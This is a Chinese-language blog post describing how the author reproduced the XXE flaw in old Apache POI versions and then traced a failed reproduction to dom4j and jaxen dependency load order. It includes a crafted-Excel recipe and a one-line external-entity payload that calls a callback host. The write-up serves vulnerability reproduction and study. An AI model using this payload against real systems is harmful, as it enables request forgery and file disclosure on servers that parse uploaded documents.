漏洞概述


Apache-POI是用来操作微软文档(office大家族）的Java API，根据百度百科的记载，主要有以下5种能力：

HSSF － 提供读写Microsoft Excel格式档案的功能。 

XSSF － 提供读写Microsoft Excel OOXML格式档案的功能。HWPF － 提供读写Microsoft Word格式档案的功能。 

HSLF － 提供读写Microsoft PowerPoint格式档案的功能。HDGF － 提供读写Microsoft Visio格式档案的功能。

之前在开发文档预览功能时也用到了这个组件，可以说是非常熟悉了，问题就出在Apache POI <3.10.1版本在读取excel文件时，对其中包含的XML外部实体引用从而导致了XXE漏洞。

一般我们只需要引入poi-ooxml这个组件就可以完成文档预览，excel数据解析展示等功能了，以poi-ooxml-3.9-Final为例，它又依赖了如下JAR包：


XXE的excel制作过程

根据网上的POC，大致是通过修改excel文件里的[Content_Types].xml，从第二行加入XML的注入代码，通过引入外部实体地址，如果发现程序去请求指定的URL即可证明该漏洞存在。

EXCEL的结构：日常办公使用广泛的Excel,其实是个压缩包，通过重命名为rar或zip格式，然后执行解压缩会发现一些文件夹结构，最外层的就是[Content_Types].xml

然后在第二行加入下图中的示例代码：

<!DOCTYPE Default [ <!ENTITY xxe SYSTEM "http://yours.ceye.io/xxe.dtd"> ]><Default>&xxe;</Default>

接下来再将修改的文件重新压缩为zip文件（注意：如果选择压缩为rar格式的话，压缩标准记得选择存储，不然里面的内容是文本格式，不是二进制格式。）

爬坑之旅记录

在走成功复现漏洞之前，我的确是踏进了自己挖的坑。由于我是在以前的工程中直接新增poi-ooxml.10-FINAL这个组件，但是里面还有其它的依赖包，坑点就在我还引入了commons-jelly，即：

<dependency>      <groupId>commons-jelly</groupId>      <artifactId>commons-jelly</artifactId>      <version>1.0.1</version>  </dependency><dependency>      <groupId>org.apache.poi</groupId>      <artifactId>poi-ooxml</artifactId>      <version>3.10-FINAL</version></dependency>

然后会发现明明poi-ooxml-3.10-FINAL及之前版本都是存在XXE漏洞的，但却一直无法复现，为此还在本地搭建了接收请求的服务，然无果，百思不得其解。

无奈只能先一步一步调试，看看哪里的问题，最终调试到ContentTypeManager.class#ContentTypeManager

抛出的异常是

"InvalidFormatException@142 org.apache.poi.openxml4j.exceptions.InvalidFormatException: Error on line 2 of document  : parsing initialization error: org.gjt.xpp.XmlPullParserException: <![DOCTYPE declarations not supported at line 2 and column 76 seen .... (parser state UNKNONW"


看意思是无法解析文档声明喽，这有点出乎我的意料。百度无果后只能继续看为啥我复现不出来，有可能我多引入了一些奇怪的jar包导致的兼容性？

回顾之前的操作，有可能是commons-jelly搞的鬼，果不其然，注释掉commons-jelly的依赖引用之后，果然发现成功接收到请求，漏洞复现成功了。当然这时就有一个疑问，这个commons-jelly为啥阻止解析doctype。

（1）首先看下commons-jelly-1.0.1它都依赖了哪些组件，目前就先重点关注这两个，为啥是找到的这两个，中间过程就不叙述了。


https://repo1.maven.org/maven2/commons-jelly/commons-jelly/1.0.1/commons-jelly-1.0.1.pom（感谢同事协助）

（2）再看下前面说的poi-ooxml-3.9-Final依赖的是dom4j-1.6.1

  (3)继续看下dom4j-1.6.1 依赖了jaxen-1.1-beta-6:

（4）根据maven的最短路径优先原则和申明顺序优先原则，显式添加这两个组件的依赖。

经过实践，最终确定的是dom4j-1.5.x版本和jaxen-all存在问题。

a.通过包比较发现仅引用dom4j-1.5.x时,maven依赖结构如下：a.结论是可以复现漏洞

b.同时显示引用do4j-1.5.2和jaxen-beta-1.4的话，依赖情况和上图一样，b.结论是无法复现漏洞


c.同时显示引用do4j-1.5.2和jaxen-beta-1.4的话，但先后顺序换一下依赖情况和上图一样，c.结论是可以复现漏洞

d.同时显示引用do4j-1.6.1和jaxen-beta-1.4,顺序同b:d.结论是可以复现漏洞


e.再看下仅引用poi-ooxml-3.9-Final：:e.结论是可以复现漏洞

通过以上比较，发现jaxen这个依赖是可选的，最终maven编译时并没有使用它，如果dom4j-1.5.x和jaxen加载顺序不对就会无法复现漏洞，可以通过mv dependency:tree 可以看出加载顺序。


这也就解释通了为啥dom4j-1.5.x 版本和jaxen所有版本一起打依赖，如果不注意依赖顺序就会出现无法复现漏洞的问题，但dom4j-1.6.x可以不用管jaxen的顺序，因为它是可选的，实际上并没有用到这个包。哎~终于爬坑出来了。

总结


问题到这里就清楚了，先是common-jetty引入导致就不能复现这个XXE漏洞，然后一路追踪到dom4j和jaxen的依赖引入问题，最后定位到他们先后加载顺序导致的问题，最终也是发现dom4j-1.6.x 是不用管jaxen的加载顺序的，因为之前都在找具体原因，所以XXE漏洞代码层面调用分析就没来得及去写，可以参考下清水师傅的分析，我们下期见~
